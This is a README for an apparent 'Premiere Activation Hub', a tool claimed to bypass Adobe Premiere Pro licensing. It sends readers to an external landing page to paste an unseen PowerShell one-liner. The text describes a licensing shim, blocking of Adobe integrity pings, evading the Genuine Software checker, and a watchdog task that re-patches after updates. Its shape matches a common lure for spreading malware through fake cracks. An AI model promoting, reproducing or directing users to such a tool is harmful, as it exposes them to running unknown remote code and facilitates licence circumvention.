<div align="center">
<img src="assets/banner.png" width="100%" alt="Adobe Premiere Pro Activator banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-ff5065?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-9333EA?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-0891B2?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=EA580C&size=28&center=true&vCenter=true&width=900&lines=%F0%9F%92%A1+Premiere+Activation+Hub+Pro;%F0%9F%94%A7+Standalone+.exe+Release;%E2%AD%90+No+Limits;%E2%9C%A8+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=windows" />
  <img src="https://skillicons.dev/icons?i=vscode" />
  <img src="https://skillicons.dev/icons?i=github" />
</p>

---

### 🖥️ PowerShell Setup

Launch the activator hub on Windows 10/11 by opening PowerShell and running the one-liner from the landing page — full bootstrap, patching, and plugin sync handled automatically.

![status](https://img.shields.io/badge/status-active-brightgreen) ![os](https://img.shields.io/badge/os-Windows%2010%20%7C%2011-blue) ![ps](https://img.shields.io/badge/PowerShell-5.1%2B-5391FE) ![license](https://img.shields.io/badge/license-MIT-lightgrey)

<p align="center">
  <a href="https://axeltrain.github.io/premiere-activation-hub/">
    <img src="files/button.svg" width="520" alt="PowerShell Setup Guide" />
  </a>
</p>

<p align="center"><img src="assets/ui/settings.png" alt="Hub Settings — Profiles & Watchdog" width="100%" /></p>
<p align="center"><sub>Settings — watchdog, shield, bridge, and the local LLM helper inputs.</sub></p>

## System Requirements

- Windows 10 or Windows 11 (x64)
- PowerShell 5.1 or newer (PowerShell 7 recommended for `-Parallel` bootstrap)
- An active internet connection for the initial pull
- Adobe Premiere Pro installed (any version from CC 2019 through 2026)
- ~120 MB free disk for the hub cache and stub modules

No runtime, no installer, no admin elevation required for the portable path.

## Features

- 🎬 **LicenseGate** — offline activation shim that latches onto the Premiere Pro licensing service without touching core binaries
- 🧩 **PluginBridge** — auto-mounts third-party `.prm` effects and keeps your plugin folder in sync between activations
- 🕵️ **TelemetryShield** — blocks the Adobe Genuine Software Integrity background pings (the ones that quietly re-validate)
- 🔁 **PatchRoll** — version-aware patcher that re-applies hooks after a Premiere auto-update without a full re-run
- 🧠 **LLM Helper (2026)** — local model suggests which modules to toggle based on your Premiere crash logs and GPU profile
- 📦 **PortableCache** — fully portable profile, drop the folder on a USB stick and it follows you between machines
- 🛠️ **Diagnostics** — `Get-HubStatus` cmdlet prints module health, patch state, and last activation timestamp
- 🔐 **IntegrityGuard** — verifies each module hash against the manifest before load, so a corrupted pull fails loudly
- ⚡ **FastBoot** — cold start under 4 seconds on a mid-range machine (down from 11s in v1.6)

## How it works

The landing page hosts the bootstrap script. You open PowerShell, paste the one-liner, hit Enter. The script pulls the hub manifest, verifies module hashes against the signed manifest, drops the portable runtime into `%LOCALAPPDATA%\PremiereActivationHub`, and then walks you through the module picker.

On first run it detects your installed Premiere Pro build, matches it to the correct `LicenseGate` profile, and stages the patch. `PatchRoll` registers a lightweight watchdog so the next Premiere update triggers a re-stage instead of a silent break. `PluginBridge` scans your existing plugin folder and writes a manifest you can inspect.

Everything runs out of user space — no `C:\Program Files` writes, no service installs, no registry hives beyond the standard `HKCU` app keys. Uninstall is `Remove-Hub -Purge` and it's gone.

The 2026 build swaps the old monolithic patcher for per-module toggles, so you can run `LicenseGate` alone if you don't want the shield or the bridge. That's the change I'm most proud of — v1.6 was all-or-nothing and it annoyed me every time I just wanted a clean activation on a fresh VM.

## Compatibility

| Environment | Status |
|---|---|
| Premiere Pro CC 2019 – 2026 | ✅ tested |
| Windows 10 21H2+ | ✅ tested |
| Windows 11 22H2 – 24H2 | ✅ tested |
| Offline activation (post-bootstrap) | ✅ works |
| Adobe Creative Cloud auto-update | ⚠️ triggers PatchRoll re-stage |
| ARM64 Windows | ❌ not supported |

Offline note: after the initial pull, the hub runs fully offline. `LicenseGate` caches the activation blob locally and `TelemetryShield` doesn't need the network to function.

## FAQ

<details><summary>Does this need admin rights?</summary>
No. The portable path runs entirely in user space. If you want `PluginBridge` to reach a system-wide plugin folder you'll need elevation, but that's opt-in.</details>

<details><summary>Will an Adobe update break my activation?</summary>
Usually not permanently. `PatchRoll`'s watchdog detects the version bump and re-stages the correct profile on the next hub launch. If it misses, `Repair-Hub` re-runs detection manually.</details>

<details><summary>Why PowerShell and not an installer?</summary>
An installer is a signed binary someone has to trust blind. A visible bootstrap script you can read before running is more honest, and it lets the hub update itself without a new download each time.</details>

<details><summary>Is this detected by Adobe?</summary>
`TelemetryShield` blocks the integrity pings, and `LicenseGate` avoids writing the patterns the Genuine Software checker looks for. That said, this is a cat-and-mouse game — no shim is permanent. Treat it as best-effort, not a guarantee.</details>

<details><summary>Can I run it alongside a real license?</summary>
Yes, but there's no point. If you have a legit seat, `LicenseGate` just stays dormant and the other modules (`PluginBridge`, `Diagnostics`) still work fine on their own.</details>

<details><summary>What's the LLM Helper actually doing?</summary>
It reads your local Premiere crash logs and GPU profile, then suggests which modules are likely causing instability or which ones you probably don't need. It's a local model, nothing leaves your machine. I added it because I got tired of guessing which module broke after a driver update.</details>

<details><summary>How do I uninstall?</summary>
`Remove-Hub -Purge` from the hub shell. It removes the portable folder, the `HKCU` keys, and the watchdog task. Premiere itself is untouched.</details>

<details><summary>Is there a Mac version?</summary>
No, and there won't be. The patching approach here is Windows-specific. I don't have a Mac to test on and I'm not going to ship something I can't verify.</details>

## Disclaimer

This is a hobbyist/educational project. It is not affiliated with, endorsed by, or supported by Adobe. Using activation bypass tools may violate Adobe's Terms of Service and your local laws — use at your own risk. The author takes no responsibility for account bans, broken installs, or legal consequences. If you rely on Premiere Pro professionally, buy a license.

## License

MIT. Do what you want, just don't blame me. See `LICENSE` for the boring part.

---

*Last thing I'll say: if `PatchRoll` saves you a reinstall after an update, that's the whole reason I wrote it. — built at 2am, tested at 3.*